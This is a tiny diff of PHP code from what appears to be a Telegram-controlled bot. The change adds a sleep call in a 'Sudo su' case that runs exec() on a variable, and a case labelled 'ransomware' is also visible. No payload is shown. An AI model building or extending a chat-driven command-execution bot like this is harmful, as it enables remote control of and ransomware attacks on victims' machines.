@@ -146,7 +146,7 @@ case 'Sudo su':
    sendMessage($chatId, $response);
   sleep (2);
       echo exec ($wanna);
-
+      sleep (2);
   break;
   
  case 'ransomware':
